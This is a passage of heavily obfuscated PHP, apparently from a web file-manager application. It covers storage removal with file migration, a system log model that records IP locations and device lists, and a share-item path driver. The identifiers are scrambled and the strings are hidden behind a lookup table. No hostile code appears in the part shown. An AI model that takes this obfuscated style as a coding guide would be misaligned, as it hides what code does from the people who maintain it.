$¹Ã«áıš[0]; if ($¹Ã«áıš) { $¹Ã«áıš[$½‚¥ªÑ«[6]] = json_decode($¹Ã«áıš[$½‚¥ªÑ«[6]], !0); } return $¹Ã«áıš; } public function driverInfo($Ê«±ìß) { $à¥Âñ‘— =& $_SERVER[–Ú¬çÁ]; $·’š¾Û— = array_to_keyvalue(parent::listData(), $à¥Âñ‘—[452]); if (!isset($·’š¾Û—[$Ê«±ìß])) { return !1; } $öõôƒ¥ç = $·’š¾Û—[$Ê«±ìß]; $öõôƒ¥ç[$à¥Âñ‘—[6]] = json_decode($öõôƒ¥ç[$à¥Âñ‘—[6]], !0); return $öõôƒ¥ç; } public function remove($›şûïËş) { $this->removeShareItems($›şûïËş); return parent::remove($›şûïËş); } public function removeWithFile($Ÿƒ¬Ï³µ, $—õş÷êñ) { $ÆĞšÈ’ =& $_SERVER[–Ú¬çÁ]; $ˆÚıç›Ã = array($ÆĞšÈ’[837] => $Ÿƒ¬Ï³µ); $ÊÙŞ¡Ö = Model($ÆĞšÈ’[521])->where($ˆÚıç›Ã)->count(); $Ù†˜ºõ¢ = Model($ÆĞšÈ’[521])->where($ˆÚıç›Ã)->sum($ÆĞšÈ’[76]); $İôÅ€Ê = $—õş÷êñ . $ÆĞšÈ’[2196] . $Ÿƒ¬Ï³µ; $‹ÑÃ¦’ = LNG($—õş÷êñ == $ÆĞšÈ’[598] ? $ÆĞšÈ’[2197] : $ÆĞšÈ’[2198]); $¶©òÓß³ = new TaskFileTransfer($İôÅ€Ê, $ÆĞšÈ’[2192], $ÊÙŞ¡Ö, $‹ÑÃ¦’ . "\x28{$Ÿƒ¬Ï³µ}\51"); $¶©òÓß³->task[$ÆĞšÈ’[783]] = (double) $Ù†˜ºõ¢; $Ø³‘Â– = KodIO::defaultDriver(); $Òè±àµÕ = $Ø³‘Â–[$ÆĞšÈ’[452]]; $Ù€Ñå = "\x7b\151\157\72{$Òè±àµÕ}\x7d\x2f"; $ç¹ÓÊë = !0; $ ˜Œ±™­ = array(); $œÂ†ÃÃ = Model($ÆĞšÈ’[224])->where($ˆÚıç›Ã)->field($ÆĞšÈ’[2199])->select(); foreach ($œÂ†ÃÃ as $ñÊ›”Õ¨) { $¼¶¢ç´ü = $ñÊ›”Õ¨[$ÆĞšÈ’[84]]; $”Ó•Âàå = $Ù€Ñå . str_replace("\x7b\x69\x6f\72{$Ÿƒ¬Ï³µ}\175\57", $ÆĞšÈ’[12], $¼¶¢ç´ü); if (!IO::exist($¼¶¢ç´ü)) { $ ˜Œ±™­[] = $ñÊ›”Õ¨[$ÆĞšÈ’[518]]; $¶©òÓß³->updateFileEnd($ñÊ›”Õ¨[$ÆĞšÈ’[32]], $ñÊ›”Õ¨[$ÆĞšÈ’[76]]); continue; } if (IO::exist($”Ó•Âàå)) { $¶©òÓß³->updateFileEnd($ñÊ›”Õ¨[$ÆĞšÈ’[32]], $ñÊ›”Õ¨[$ÆĞšÈ’[76]]); continue; } if (!IO::move($¼¶¢ç´ü, get_path_father($”Ó•Âàå))) { $ç¹ÓÊë = !1; break; } $ˆÚıç›Ã = array($ÆĞšÈ’[518] => $ñÊ›”Õ¨[$ÆĞšÈ’[518]]); $óæÀê‘ = array($ÆĞšÈ’[837] => $Òè±àµÕ, $ÆĞšÈ’[84] => $”Ó•Âàå); Model($ÆĞšÈ’[224])->where($ˆÚıç›Ã)->save($óæÀê‘); } $this->removeByFileID($ ˜Œ±™­); if (!$ç¹ÓÊë) { $¶©òÓß³->stop($İôÅ€Ê); return !1; } $¶©òÓß³->end(); if ($—õş÷êñ == $ÆĞšÈ’[1833]) { $this->remove($Ÿƒ¬Ï³µ); } } public function progress($ŸšéüƒØ, $¡òóÚÃç) { return Task::get($¡òóÚÃç . $_SERVER[–Ú¬çÁ][2196] . $ŸšéüƒØ); } private function removeByFileID($çéÕ¢ªò = array()) { $ú¦éù¢ò =& $_SERVER[–Ú¬çÁ]; if (empty($çéÕ¢ªò)) { return; } $•ğòÈ Â = array($ú¦éù¢ò[518] => array($ú¦éù¢ò[7], $çéÕ¢ªò)); $Â¤Û…ª™ = Model($ú¦éù¢ò[1352])->where($•ğòÈ Â)->field($ú¦éù¢ò[181])->select(); if (!$Â¤Û…ª™) { return; } $Â¤Û…ª™ = array_to_keyvalue($Â¤Û…ª™, $ú¦éù¢ò[12], $ú¦éù¢ò[181]); foreach ($Â¤Û…ª™ as $ù†ë½Àõ) { Model($ú¦éù¢ò[467])->removeNow($ù†ë½Àõ, !1); } } private function removeShareItems($êÄĞ¦ÜŠ) { $€Õ Û”– =& $_SERVER[–Ú¬çÁ]; $áê²…¿ = "\173\x69\157\72{$êÄĞ¦ÜŠ}\x7d\x2f"; $£ÅÆ¥’Â = array($€Õ Û”–[181] => 0, $€Õ Û”–[1195] => array($€Õ Û”–[436], "{$áê²…¿}\45")); $õ©òÒš = Model($€Õ Û”–[1844])->where($£ÅÆ¥’Â)->field($€Õ Û”–[643])->select(); if (empty($õ©òÒš)) { return; } $”†µ€ëı = array_to_keyvalue($õ©òÒš, $€Õ Û”–[12], $€Õ Û”–[643]); Model($€Õ Û”–[642])->remove($”†µ€ëı); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\56\x4c\x69\x67\x68\x74\101\160\x70"; public $modelType = "\x53\171\x73\x74\x65\155\117\160\x74\151\x6f\156"; public $field = array("\156\x61\x6d\145", "\147\x72\157\x75\x70", "\x64\x65\163\x63", "\x63\x6f\156\164\145\x6e\x74"); public function listData($“ÌÎ®†© = false, $ŸÑƒ„–á = "\x6d\x6f\x64\x69\x66\171\x54\x69\155\145", $—ğáš = true) { return parent::listData($“ÌÎ®†©, $ŸÑƒ„–á, $—ğáš); } public function remove($µÙ•¾ï) { $¹ŠãÊİó = $this->findByName($µÙ•¾ï); if (!$¹ŠãÊİó) { return !1; } return parent::remove($¹ŠãÊİó[$_SERVER[–Ú¬çÁ][452]]); } public function add($¨ÉÑ’‹‘) { if ($this->findByName($¨ÉÑ’‹‘[$_SERVER[–Ú¬çÁ][32]])) { return !1; } return parent::insert($¨ÉÑ’‹‘); } public function update($–‚Æã¹À, $ëÏ³ö•¼) { $±ìÓ =& $_SERVER[–Ú¬çÁ]; $¤ïû‰¶ü = $this->findByName($–‚Æã¹À); $Û€°ŒÙí = $this->findByName($ëÏ³ö•¼[$±ìÓ[32]]); if (!$¤ïû‰¶ü || $Û€°ŒÙí && $Û€°ŒÙí[$±ìÓ[452]] != $¤ïû‰¶ü[$±ìÓ[452]]) { return !1; } return parent::update($¤ïû‰¶ü[$±ìÓ[452]], $ëÏ³ö•¼); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\164\x65\155\x5f\154\157\x67"; protected $dataAuto = array(array("\143\162\x65\141\164\x65\x54\x69\155\x65", "\164\151\155\145", "\x69\x6e\163\145\x72\164", "\x66\x75\x6e\143\x74\x69\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ŸÕÓœ˜ã =& $_SERVER[–Ú¬çÁ]; return array($ŸÕÓœ˜ã[2200] => LNG($ŸÕÓœ˜ã[2201]), $ŸÕÓœ˜ã[2202] => LNG($ŸÕÓœ˜ã[2203]), $ŸÕÓœ˜ã[1807] => LNG($ŸÕÓœ˜ã[2204]), $ŸÕÓœ˜ã[2205] => LNG($ŸÕÓœ˜ã[2206]), $ŸÕÓœ˜ã[2207] => LNG($ŸÕÓœ˜ã[2208]), $ŸÕÓœ˜ã[2209] => LNG($ŸÕÓœ˜ã[2210]), $ŸÕÓœ˜ã[2211] => LNG($ŸÕÓœ˜ã[2212]), $ŸÕÓœ˜ã[1837] => LNG($ŸÕÓœ˜ã[2212]), $ŸÕÓœ˜ã[1838] => LNG($ŸÕÓœ˜ã[2213]), $ŸÕÓœ˜ã[2214] => LNG($ŸÕÓœ˜ã[2215]), $ŸÕÓœ˜ã[2216] => LNG($ŸÕÓœ˜ã[2217]), $ŸÕÓœ˜ã[2218] => LNG($ŸÕÓœ˜ã[2219]), $ŸÕÓœ˜ã[2220] => LNG($ŸÕÓœ˜ã[2221]), $ŸÕÓœ˜ã[1835] => LNG($ŸÕÓœ˜ã[2222]), $ŸÕÓœ˜ã[2223] => LNG($ŸÕÓœ˜ã[2224]), $ŸÕÓœ˜ã[1842] => LNG($ŸÕÓœ˜ã[2225]), $ŸÕÓœ˜ã[2226] => LNG($ŸÕÓœ˜ã[2227]), $ŸÕÓœ˜ã[2228] => LNG($ŸÕÓœ˜ã[2229]), $ŸÕÓœ˜ã[2230] => LNG($ŸÕÓœ˜ã[2231]), $ŸÕÓœ˜ã[2232] => LNG($ŸÕÓœ˜ã[2233]), $ŸÕÓœ˜ã[1845] => LNG($ŸÕÓœ˜ã[2234]), $ŸÕÓœ˜ã[1846] => LNG($ŸÕÓœ˜ã[2235]), $ŸÕÓœ˜ã[2236] => LNG($ŸÕÓœ˜ã[2237]), $ŸÕÓœ˜ã[2238] => LNG($ŸÕÓœ˜ã[2239]), $ŸÕÓœ˜ã[2240] => LNG($ŸÕÓœ˜ã[2241]), $ŸÕÓœ˜ã[1840] => LNG($ŸÕÓœ˜ã[2242]), $ŸÕÓœ˜ã[2243] => LNG($ŸÕÓœ˜ã[2244]), $ŸÕÓœ˜ã[1839] => LNG($ŸÕÓœ˜ã[2245]), $ŸÕÓœ˜ã[2246] => LNG($ŸÕÓœ˜ã[2247]), $ŸÕÓœ˜ã[2248] => LNG($ŸÕÓœ˜ã[2249]), $ŸÕÓœ˜ã[2250] => LNG($ŸÕÓœ˜ã[2251]), $ŸÕÓœ˜ã[2252] => LNG($ŸÕÓœ˜ã[2252]), $ŸÕÓœ˜ã[2253] => LNG($ŸÕÓœ˜ã[1811]), $ŸÕÓœ˜ã[2254] => LNG($ŸÕÓœ˜ã[2255]), $ŸÕÓœ˜ã[2256] => LNG($ŸÕÓœ˜ã[2257]), $ŸÕÓœ˜ã[2258] => LNG($ŸÕÓœ˜ã[2259]), $ŸÕÓœ˜ã[2260] => LNG($ŸÕÓœ˜ã[2261]), $ŸÕÓœ˜ã[2262] => LNG($ŸÕÓœ˜ã[2263]), $ŸÕÓœ˜ã[2264] => LNG($ŸÕÓœ˜ã[2264]), $ŸÕÓœ˜ã[2265] => LNG($ŸÕÓœ˜ã[2266]), $ŸÕÓœ˜ã[2267] => LNG($ŸÕÓœ˜ã[2268]), $ŸÕÓœ˜ã[2269] => LNG($ŸÕÓœ˜ã[2270]), $ŸÕÓœ˜ã[2271] => LNG($ŸÕÓœ˜ã[2272]), $ŸÕÓœ˜ã[2273] => LNG($ŸÕÓœ˜ã[2274]), $ŸÕÓœ˜ã[2275] => LNG($ŸÕÓœ˜ã[2276])); } private function typeFile() { $Ä“½ÍáÁ =& $_SERVER[–Ú¬çÁ]; $åÖ§…œá = array($Ä“½ÍáÁ[1842] => array($Ä“½ÍáÁ[1843]), $Ä“½ÍáÁ[2218] => array($Ä“½ÍáÁ[2277]), $Ä“½ÍáÁ[2220] => array($Ä“½ÍáÁ[2278]), $Ä“½ÍáÁ[1835] => array($Ä“½ÍáÁ[1836], $Ä“½ÍáÁ[2279]), $Ä“½ÍáÁ[2228] => array(), $Ä“½ÍáÁ[2230] => array(), $Ä“½ÍáÁ[2232] => array(), $Ä“½ÍáÁ[1845] => array($Ä“½ÍáÁ[1847]), $Ä“½ÍáÁ[1846] => array($Ä“½ÍáÁ[1847]), $Ä“½ÍáÁ[2236] => array($Ä“½ÍáÁ[2280]), $Ä“½ÍáÁ[2238] => array($Ä“½ÍáÁ[2280]), $Ä“½ÍáÁ[2240] => array($Ä“½ÍáÁ[2281]), $Ä“½ÍáÁ[2226] => array($Ä“½ÍáÁ[2282]), $Ä“½ÍáÁ[1840] => array($Ä“½ÍáÁ[2283]), $Ä“½ÍáÁ[2243] => array($Ä“½ÍáÁ[2284]), $Ä“½ÍáÁ[1839] => array($Ä“½ÍáÁ[1841])); return $åÖ§…œá; } private function typeAll() { $„‡ÒÚ =& $_SERVER[–Ú¬çÁ]; $Èí¹ëÛ = $this->typeList; $°Îİ…©ä = array_filter($this->typeFile()); foreach ($°Îİ…©ä as $×”şœòš => $ãëÄ¢Î) { $Èí¹ëÛ[$ãëÄ¢Î[0]] = $Èí¹ëÛ[$×”şœòš]; } $Èí¹ëÛ[$„‡ÒÚ[1847]] = LNG($„‡ÒÚ[2285]); $Èí¹ëÛ[$„‡ÒÚ[2280]] = LNG($„‡ÒÚ[2286]); return $Èí¹ëÛ; } public function addLog($î¶øíÜŠ, $ÏĞûÍ“ = array()) { $ôÜ£ĞĞ =& $_SERVER[–Ú¬çÁ]; if (!isset($this->typeList[$î¶øíÜŠ])) { return; } $„åÔ—ÂŸ = isset($ÏĞûÍ“[$ôÜ£ĞĞ[1666]]) ? $ÏĞûÍ“[$ôÜ£ĞĞ[1666]] : 0; if (!$„åÔ—ÂŸ) { $„åÔ—ÂŸ = Session::get($ôÜ£ĞĞ[2001]); } if ($î¶øíÜŠ == $ôÜ£ĞĞ[2254] && is_array($ÏĞûÍ“[$ôÜ£ĞĞ[2287]]) && !$ÏĞûÍ“[$ôÜ£ĞĞ[2287]]) { return; } $Ú€”Ù¦ = get_client_ip(); if (!$ÏĞûÍ“ || strlen(json_encode($ÏĞûÍ“)) >= 1024) { $ÏĞûÍ“ = array($ôÜ£ĞĞ[2288] => $Ú€”Ù¦); } else { if (is_array($ÏĞûÍ“)) { $ÏĞûÍ“[$ôÜ£ĞĞ[2288]] = $Ú€”Ù¦; } else { $ÏĞûÍ“ = array($ôÜ£ĞĞ[1222] => $ÏĞûÍ“, $ôÜ£ĞĞ[2288] => $Ú€”Ù¦); } } $ÏĞûÍ“ = array($ôÜ£ĞĞ[1656] => Session::sign(), $ôÜ£ĞĞ[1657] => intval($„åÔ—ÂŸ), $ôÜ£ĞĞ[33] => $î¶øíÜŠ, $ôÜ£ĞĞ[1659] => json_encode($ÏĞûÍ“)); parent::add($ÏĞûÍ“); } public function remove($±…«ÚÁú) { $this->where(array($_SERVER[–Ú¬çÁ][470] => $±…«ÚÁú))->delete(); } private function _makeOrder($ÆÍ‘Ÿû¸ = '') { $·ò³ö§‹ =& $_SERVER[–Ú¬çÁ]; $¡şÁ–ü¤ = $·ò³ö§‹[225]; $‹ß±“óÁ = array($·ò³ö§‹[500] => $·ò³ö§‹[501], $·ò³ö§‹[502] => $·ò³ö§‹[503]); $½¤¬ËÅ = Input::get($·ò³ö§‹[508], $·ò³ö§‹[7], $·ò³ö§‹[2037], array($·ò³ö§‹[1955], $·ò³ö§‹[502])); $½¤¬ËÅ = $‹ß±“óÁ[$½¤¬ËÅ]; $ÆÍ‘Ÿû¸ = $ÆÍ‘Ÿû¸ . "{$¡şÁ–ü¤}\x20{$½¤¬ËÅ}"; return $this->order($ÆÍ‘Ÿû¸); } public function get($Ï€ëôÈÕ = '') { $šÇû®ªø =& $_SERVER[–Ú¬çÁ]; if (!$Ï€ëôÈÕ) { show_json(array()); } $ÅÆø¾ğ… = array(); if ($Ï€ëôÈÕ[$šÇû®ªø[1666]]) { $ÅÆø¾ğ…[$šÇû®ªø[1666]] = $Ï€ëôÈÕ[$šÇû®ªø[1666]]; } if (isset($Ï€ëôÈÕ[$šÇû®ªø[780]])) { $°œ¸ºÕÎ = $Ï€ëôÈÕ[$šÇû®ªø[780]]; $åòƒÉö = isset($Ï€ëôÈÕ[$šÇû®ªø[781]]) ? $Ï€ëôÈÕ[$šÇû®ªø[781]] : time(); $ÅÆø¾ğ…[$šÇû®ªø[225]] = array($šÇû®ªø[386], array($°œ¸ºÕÎ, $åòƒÉö)); } if ($Ï€ëôÈÕ[$šÇû®ªø[33]]) { $º¢¬¹ñƒ = explode($šÇû®ªø[50], $Ï€ëôÈÕ[$šÇû®ªø[33]]); $í‰ş©šø = $this->typeFile(); $èÙª´óı = array(); foreach ($º¢¬¹ñƒ as $ÈØùÚû¬) { $èÙª´óı[] = $ÈØùÚû¬; if (isset($í‰ş©šø[$ÈØùÚû¬])) { $èÙª´óı = array_merge($èÙª´óı, $í‰ş©šø[$ÈØùÚû¬]); } } $èÙª´óı = array_unique($èÙª´óı); if ($èÙª´óı) { $ÅÆø¾ğ…[$šÇû®ªø[33]] = array($šÇû®ªø[7], $èÙª´óı); } } else { $ÅÆø¾ğ…[$šÇû®ªø[33]] = array($šÇû®ªø[2289], $šÇû®ªø[2290]); } if (!empty($Ï€ëôÈÕ[$šÇû®ªø[2288]])) { $ÅÆø¾ğ…[$šÇû®ªø[503]] = array($šÇû®ªø[436], "\x25{$Ï€ëôÈÕ[$šÇû®ªø[2288]]}\45"); } $•›œ˜…Æ = $this->_makeOrder()->where($ÅÆø¾ğ…)->selectPage(); if (empty($•›œ˜…Æ[$šÇû®ªø[422]])) { show_json(array(), !0, $•›œ˜…Æ[$šÇû®ªø[419]]); } $•›œ˜…Æ[$šÇû®ªø[422]] = $this->logList($•›œ˜…Æ[$šÇû®ªø[422]]); return $•›œ˜…Æ; } private function ipAddress(&$¦òÛÃ) { $·Øêä¾Ø =& $_SERVER[–Ú¬çÁ]; if (!empty($¦òÛÃ[$·Øêä¾Ø[2288]])) { $ú²·Ÿö = IpLocation::get($¦òÛÃ[$·Øêä¾Ø[2288]]); } else { $ú²·Ÿö = LNG($·Øêä¾Ø[2291]); } $¦òÛÃ[$·Øêä¾Ø[2292]] = $ú²·Ÿö; } private function descZipDownload($«½‚Ì¥ƒ, &$ºİıËò) { $÷ÃÙïß¸ =& $_SERVER[–Ú¬çÁ]; if (!isset($«½‚Ì¥ƒ[$÷ÃÙïß¸[2293]])) { return; } $›©Ëª¶ü = json_decode($«½‚Ì¥ƒ[$÷ÃÙïß¸[2293]], !0); foreach ($›©Ëª¶ü as $™×âŠÄ) { try { $Ë¬êÃ¯ı = IO::infoFullSimple($™×âŠÄ[$÷ÃÙïß¸[84]]); } catch (Exception $ÏÃ–ãëˆ) { continue; } $«½‚Ì¥ƒ[$÷ÃÙïß¸[84]] = $™×âŠÄ[$÷ÃÙïß¸[84]]; $ºİıËò[] = $«½‚Ì¥ƒ[$÷ÃÙïß¸[181]] = $Ë¬êÃ¯ı[$÷ÃÙïß¸[181]]; $ºİıËò[] = $«½‚Ì¥ƒ[$÷ÃÙïß¸[2092]] = $Ë¬êÃ¯ı[$÷ÃÙïß¸[180]]; break; } return $«½‚Ì¥ƒ; } private function getSourceList(&$öğ°ÀÀÀ) { $å±ÓÃÅÚ =& $_SERVER[–Ú¬çÁ]; $æç„¿îô = array(); foreach ($öğ°ÀÀÀ as $ä¬ì¿¥ => $’²õÃÕ) { $ğ›Ãİ‡í = json_decode($’²õÃÕ[$å±ÓÃÅÚ[503]], !0); if ($’²õÃÕ[$å±ÓÃÅÚ[33]] == $å±ÓÃÅÚ[1838]) { $ğ›Ãİ‡í = $this->descZipDownload($ğ›Ãİ‡í, $æç„¿îô); $öğ°ÀÀÀ[$ä¬ì¿¥][$å±ÓÃÅÚ[503]] = json_encode($ğ›Ãİ‡í); continue; } if (strpos($’²õÃÕ[$å±ÓÃÅÚ[33]], $å±ÓÃÅÚ[2094]) !== 0) { if (!isset($ğ›Ãİ‡í[$å±ÓÃÅÚ[84]]) || strpos($’²õÃÕ[$å±ÓÃÅÚ[33]], $å±ÓÃÅÚ[2294]) !== 0) { continue; } try { $”Øåßú = IO::infoFullSimple($ğ›Ãİ‡í[$å±ÓÃÅÚ[84]]); } catch (Exception $Ûº£á“Ë) { continue; } $æç„¿îô[] = $ğ›Ãİ‡í[$å±ÓÃÅÚ[181]] = $”Øåßú[$å±ÓÃÅÚ[181]]; $æç„¿îô[] = $ğ›Ãİ‡í[$å±ÓÃÅÚ[2092]] = $”Øåßú[$å±ÓÃÅÚ[180]]; $öğ°ÀÀÀ[$ä¬ì¿¥][$å±ÓÃÅÚ[503]] = json_encode($ğ›Ãİ‡í); continue; } $æç„¿îô[] = $ğ›Ãİ‡í[$å±ÓÃÅÚ[181]]; $æç„¿îô[] = $ğ›Ãİ‡í[$å±ÓÃÅÚ[2092]]; if ($ğ›Ãİ‡í[$å±ÓÃÅÚ[33]] == $å±ÓÃÅÚ[598]) { $æç„¿îô[] = $ğ›Ãİ‡í[$å±ÓÃÅÚ[503]][$å±ÓÃÅÚ[1180]]; $æç„¿îô[] = $ğ›Ãİ‡í[$å±ÓÃÅÚ[503]][$å±ÓÃÅÚ[1181]]; } if ($ğ›Ãİ‡í[$å±ÓÃÅÚ[33]] == $å±ÓÃÅÚ[2102]) { $æç„¿îô[] = $ğ›Ãİ‡í[$å±ÓÃÅÚ[503]][$å±ÓÃÅÚ[181]]; } } if (!$æç„¿îô) { return array(); } return Model($å±ÓÃÅÚ[845])->sourceListInfo($æç„¿îô, !0); } private function logList($…¨¨¯©) { $ãçØÓ‚ =& $_SERVER[–Ú¬çÁ]; $¥”ôØ”ø = array_to_keyvalue($…¨¨¯©, $ãçØÓ‚[12], $ãçØÓ‚[1666]); $İÚ§ñÜß = Model($ãçØÓ‚[577])->userListInfo(array_unique($¥”ôØ”ø)); $¿Üòí½µ = $this->getSourceList($…¨¨¯©); $Àø“¯¯ = $this->typeAll(); $³ÆÁÛÚ = array(); $­ŒãÏ«ì = array(); foreach ($…¨¨¯© as $³‹¶ÀÎÈ => $ò³ß) { $ıÃî´°› = $ò³ß[$ãçØÓ‚[33]]; $ÊÙ»æÓã = isset($İÚ§ñÜß[$ò³ß[$ãçØÓ‚[1666]]]) ? $İÚ§ñÜß[$ò³ß[$ãçØÓ‚[1666]]] : !1; $ªƒşœßÖ = strpos($ıÃî´°›, $ãçØÓ‚[2295]) === 0 ? LNG($ãçØÓ‚[2296]) : LNG($ãçØÓ‚[2291]); $ò³ß[$ãçØÓ‚[32]] = isset($ÊÙ»æÓã[$ãçØÓ‚[32]]) ? $ÊÙ»æÓã[$ãçØÓ‚[32]] : LNG($ãçØÓ‚[2291]); $ò³ß[$ãçØÓ‚[2146]] = isset($ÊÙ»æÓã[$ãçØÓ‚[2146]]) ? $ÊÙ»æÓã[$ãçØÓ‚[2146]] : $ãçØÓ‚[12]; $ò³ß[$ãçØÓ‚[1561]] = isset($Àø“¯¯[$ıÃî´°›]) ? $Àø“¯¯[$ıÃî´°›] : $ªƒşœßÖ; $ò³ß[$ãçØÓ‚[2036]] = $ÊÙ»æÓã; $•™Ò¤»¢ = json_decode($ò³ß[$ãçØÓ‚[503]], !0); $ò³ß[$ãçØÓ‚[2288]] = isset($•™Ò¤»¢[$ãçØÓ‚[2288]]) ? $•™Ò¤»¢[$ãçØÓ‚[2288]] : $ãçØÓ‚[12]; $ò³ß[$ãçØÓ‚[2292]] = IpLocation::get($ò³ß[$ãçØÓ‚[2288]]); if (strpos($ıÃî´°›, $ãçØÓ‚[2094]) === 0 || isset($•™Ò¤»¢[$ãçØÓ‚[2092]])) { $•™Ò¤»¢[$ãçØÓ‚[87]] = $¿Üòí½µ[$•™Ò¤»¢[$ãçØÓ‚[181]]]; $•™Ò¤»¢[$ãçØÓ‚[2107]] = $¿Üòí½µ[$•™Ò¤»¢[$ãçØÓ‚[2092]]]; if ($•™Ò¤»¢[$ãçØÓ‚[33]] == $ãçØÓ‚[598]) { $•™Ò¤»¢[$ãçØÓ‚[503]][$ãçØÓ‚[1180]] = $¿Üòí½µ[$•™Ò¤»¢[$ãçØÓ‚[503]][$ãçØÓ‚[1180]]]; $•™Ò¤»¢[$ãçØÓ‚[503]][$ãçØÓ‚[1181]] = $¿Üòí½µ[$•™Ò¤»¢[$ãçØÓ‚[503]][$ãçØÓ‚[1181]]]; } if ($•™Ò¤»¢[$ãçØÓ‚[33]] == $ãçØÓ‚[2102]) { $•™Ò¤»¢[$ãçØÓ‚[503]][$ãçØÓ‚[181]] = $¿Üòí½µ[$•™Ò¤»¢[$ãçØÓ‚[503]][$ãçØÓ‚[181]]]; } if ($•™Ò¤»¢[$ãçØÓ‚[33]] == $ãçØÓ‚[1833]) { $•™Ò¤»¢[$ãçØÓ‚[2107]] = $•™Ò¤»¢[$ãçØÓ‚[87]]; $•™Ò¤»¢[$ãçØÓ‚[2092]] = $•™Ò¤»¢[$ãçØÓ‚[2107]][$ãçØÓ‚[181]]; $•™Ò¤»¢[$ãçØÓ‚[87]] = !1; $•™Ò¤»¢[$ãçØÓ‚[181]] = $ãçØÓ‚[12]; } if ($•™Ò¤»¢[$ãçØÓ‚[87]] && $•™Ò¤»¢[$ãçØÓ‚[87]][$ãçØÓ‚[178]] == $ãçØÓ‚[179]) { $­ŒãÏ«ì[] = $ò³ß[$ãçØÓ‚[452]]; unset($…¨¨¯©[$³‹¶ÀÎÈ]); continue; } if ($•™Ò¤»¢[$ãçØÓ‚[2107]] && $•™Ò¤»¢[$ãçØÓ‚[2107]][$ãçØÓ‚[178]] == $ãçØÓ‚[179]) { $­ŒãÏ«ì[] = $ò³ß[$ãçØÓ‚[452]]; unset($…¨¨¯©[$³‹¶ÀÎÈ]); continue; } } $ò³ß[$ãçØÓ‚[503]] = $•™Ò¤»¢; unset($ò³ß[$ãçØÓ‚[2297]]); $³ÆÁÛÚ[] = $ò³ß; } $this->clearSystemPathLog($­ŒãÏ«ì); return $³ÆÁÛÚ; } private function clearSystemPathLog($€’üÉÖø) { $ù·«ÅŸØ =& $_SERVER[–Ú¬çÁ]; if (count($€’üÉÖø) == 0) { return; } $Ãõ¥„ö = array($ù·«ÅŸØ[452] => array($ù·«ÅŸØ[7], array_unique($€’üÉÖø))); $this->where($Ãõ¥„ö)->delete(); } public function deviceList($½ÕÌí–ì, $Ÿ—¿ØÀ“ = 0) { $ü„Ã’•‚ =& $_SERVER[–Ú¬çÁ]; $¡ŠšŠÕ÷ = array($ü„Ã’•‚[1666] => $½ÕÌí–ì, $ü„Ã’•‚[225] => array($ü„Ã’•‚[1034], $Ÿ—¿ØÀ“), $ü„Ã’•‚[33] => $ü„Ã’•‚[1807]); $×À›è¨¶ = array(); $ï¼ïÄñ§ = $this->field($ü„Ã’•‚[2298])->where($¡ŠšŠÕ÷)->order($ü„Ã’•‚[2105])->limit(50)->select(); foreach ($ï¼ïÄñ§ as $Ã”Ş´à‹ => $Äò¼Şíæ) { if ($Ã”Ş´à‹ > 0 && abs($Äò¼Şíæ[$ü„Ã’•‚[225]] - $ï¼ïÄñ§[$Ã”Ş´à‹ - 1][$ü„Ã’•‚[225]]) < 5) { continue; } $‹Ş“¸ã¦ = json_decode($Äò¼Şíæ[$ü„Ã’•‚[503]], !0); $Äò¼Şíæ[$ü„Ã’•‚[2288]] = isset($‹Ş“¸ã¦[$ü„Ã’•‚[2288]]) ? $‹Ş“¸ã¦[$ü„Ã’•‚[2288]] : $ü„Ã’•‚[12]; unset($‹Ş“¸ã¦[$ü„Ã’•‚[2288]]); $ş× ÕÑÃ = $this->deviceType($‹Ş“¸ã¦[$ü„Ã’•‚[2095]]); if (isset($×À›è¨¶[$ş× ÕÑÃ])) { continue; } $Äò¼Şíæ[$ü„Ã’•‚[2292]] = IpLocation::get($Äò¼Şíæ[$ü„Ã’•‚[2288]]); $Äò¼Şíæ[$ü„Ã’•‚[503]] = $‹Ş“¸ã¦; $×À›è¨¶[$ş× ÕÑÃ] = $Äò¼Şíæ; } return array_values($×À›è¨¶); } public function deviceType($ı««·™¢) { return $ı««·™¢; } } goto fÉ¢é¿µ; BÉô…ó¨«Ã: class PathDriverDriverShareItem { public function __construct($ê•é²•) { $this->pathParse = $ê•é²•; } public function __call($Ê‘íƒÒ÷, $ÆÖ±ùŸ) { $€ŞÓÊÌ =& $_SERVER[–Ú¬çÁ]; if (method_exists($this, $Ê‘íƒÒ÷)) { return; } $Õ÷Åü«ä = call_user_func_array(array($€ŞÓÊÌ[1361], $Ê‘íƒÒ÷), $ÆÖ±ùŸ); $õò¶Ğ¶¤ = array($€ŞÓÊÌ[1362], $€ŞÓÊÌ[1363], $€ŞÓÊÌ[1364], $€ŞÓÊÌ[1365], $€ŞÓÊÌ[596], $€ŞÓÊÌ[598], $€ŞÓÊÌ[1366], $€ŞÓÊÌ[107], $€ŞÓÊÌ[1367], $€ŞÓÊÌ[1368]); if (in_array($Ê‘íƒÒ÷, $õò¶Ğ¶¤)) { $Õ÷Åü«ä = $this->getPathOuter($Õ÷Åü«ä); } return $Õ÷Åü«ä; } public function copy($Ú÷ÂœØ¬, $ª‹İ¾‘º, $Íş„ÖŞ = false, $Ë­·™Ú¨ = false) { return $this->copyMove($Ú÷ÂœØ¬, $ª‹İ¾‘º, $Íş„ÖŞ, $_SERVER[–Ú¬çÁ][596], $Ë­·™Ú¨); } public function move($€Œƒ·Åï, $³ş½á™, $¨‰º–ô® = false, $ÜØ£íï† = false) { return $this->copyMove($€Œƒ·Åï, $³ş½á™, $¨‰º–ô®, $_SERVER[–Ú¬çÁ][598], $ÜØ£íï†); } private function copyMove($±­–ı©í, $èú«’÷±, $§ë“, $É»¸‘ìå, $„ûßÁ¹É = false) { $ÆÍ‰§ª =& $_SERVER[–Ú¬çÁ]; $çû‰ˆí× = $èú«’÷±; $‹ìâÑµŠ = IO::driverMake($èú«’÷±); if ($‹ìâÑµŠ->pathParse[$ÆÍ‰§ª[1171]]) { $èú«’÷± = $‹ìâÑµŠ->pathParse[$ÆÍ‰§ª[1171]]; } else { $èú«’÷± = $çû‰ˆí×; } $ÏÔû‡Ù = IO::copyMove($±­–ı©í, $èú«’÷±, $§ë“, $É»¸‘ìå, $„ûßÁ¹É); $ÏÔû‡Ù = $this->getPathOuter($ÏÔû‡Ù); return $ÏÔû‡Ù; } public function pathThis($ÍµœïÎ²) { return get_path_this($this->pathParse[$_SERVER[–Ú¬çÁ][84]]); } public function pathFather($¨¯»Š„—) { return 